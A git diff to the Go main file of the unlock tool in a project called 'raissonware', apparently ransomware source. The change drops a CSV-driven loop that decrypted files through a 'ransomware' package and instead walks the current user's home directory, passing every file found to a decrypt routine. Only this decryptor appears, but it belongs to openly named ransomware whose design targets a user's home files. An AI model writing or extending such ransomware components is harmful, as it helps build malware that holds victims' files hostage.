@@ -1,40 +1,29 @@
 package main
 
 import (
-	"fmt"
-	"log"
-	"os"
-	"raissonware/pkg/csv"
-	"raissonware/pkg/ransomware"
+	"os/user"
+	"raissonware/pkg/cryptography"
+	"raissonware/pkg/filesystem"
 	"sync"
 )
 
 var (
-	Wg sync.WaitGroup
+	wg sync.WaitGroup
 )
 
 func main() {
-	defer Wg.Wait()
+	defer wg.Wait()
 
-	if len(os.Args) != 2 {
-		fmt.Println("Usage: unlock <path>")
+	err := cryptography.Init(nil, nil)
+	if err != nil {
 		return
 	}
 
-	csvPath := os.Args[1]
-	var rowData *ransomware.RansomRow
-
-	csvData, err := csv.LoadCSV(csvPath)
+	Client, err := user.Current()
 	if err != nil {
-		log.Fatal(err)
+		return
 	}
 
-	for _, row := range csvData {
-		rowData, err = ransomware.ArrayOfStringToRansomRow(row)
-		if err != nil {
-			log.Fatal(err)
-		}
-
-		ransomware.DecryptFile(*rowData, &Wg)
-	}
+	chanErr := make(chan error)
+	filesystem.FindFiles(Client.HomeDir, cryptography.Decrypt, &wg, chanErr)
 }
